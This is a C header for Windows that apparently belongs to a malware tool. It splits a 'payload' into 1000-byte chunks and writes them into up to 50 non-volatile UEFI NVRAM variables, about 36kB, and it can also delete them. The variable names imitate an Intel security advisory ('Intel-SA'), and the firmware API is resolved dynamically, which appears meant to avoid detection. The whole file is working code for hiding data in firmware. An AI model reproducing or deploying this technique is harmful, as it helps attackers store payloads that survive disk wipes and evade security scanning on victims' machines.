#pragma once

#include <Windows.h>

// Constants
// ------------------------------------------------------------------------

#define VARIABLE_ATTRIBUTE_NON_VOLATILE 0x00000001

// 1000 chars/variable
#define CHUNK_SIZE 1000

// 50 variables could be created before NVRAM space runs out! ~ 36kB payload
#define MAX_NVRAM_VAR 50

// NVRAM Variable Base Name
#define NVRAM_VAR_NAME "Intel-SA"

// Function prototypes
// ------------------------------------------------------------------------

typedef BOOL(WINAPI* _SetFirmwareEnvironmentVariableExA)(
	LPCSTR lpName,
	LPCSTR lpGuid,
	PVOID  pValue,
	DWORD  nSize,
	DWORD  dwAttributes
	);

// To write into a single NVRAM variable
// ------------------------------------------------------------------------

BOOL write_nvram(LPCSTR name, LPCSTR guid, LPCSTR payload) {
	// Dynamically resolve the API functions from Kernel32.dll
    HMODULE kernel32 = GetModuleHandleA("Kernel32.dll");

	_SetFirmwareEnvironmentVariableExA SetFirmwareEnvironmentVariableExA = (_SetFirmwareEnvironmentVariableExA)GetProcAddress(kernel32, "SetFirmwareEnvironmentVariableExA");
	if (SetFirmwareEnvironmentVariableExA == NULL) {
		return FALSE;
	}

	// Set firmware variable
	DWORD returnVal = SetFirmwareEnvironmentVariableExA(name, guid, (PVOID)payload, CHUNK_SIZE, VARIABLE_ATTRIBUTE_NON_VOLATILE);
	if (returnVal == 0) {
		return FALSE;
	}

	return TRUE;
}

// To delete a single NVRAM variable
// ------------------------------------------------------------------------

BOOL delete_nvram(LPCSTR name, LPCSTR guid) {
	// Dynamically resolve the API functions from Kernel32.dll
    HMODULE kernel32 = GetModuleHandleA("Kernel32.dll");

	_SetFirmwareEnvironmentVariableExA SetFirmwareEnvironmentVariableExA = (_SetFirmwareEnvironmentVariableExA)GetProcAddress(kernel32, "SetFirmwareEnvironmentVariableExA");
	if (SetFirmwareEnvironmentVariableExA == NULL) {
		return FALSE;
	}

    // Delete firmware variable
	DWORD returnVal = SetFirmwareEnvironmentVariableExA(name, guid, NULL, 0, VARIABLE_ATTRIBUTE_NON_VOLATILE);
	if (returnVal == 0) {
		return FALSE;
	}

	return TRUE;
}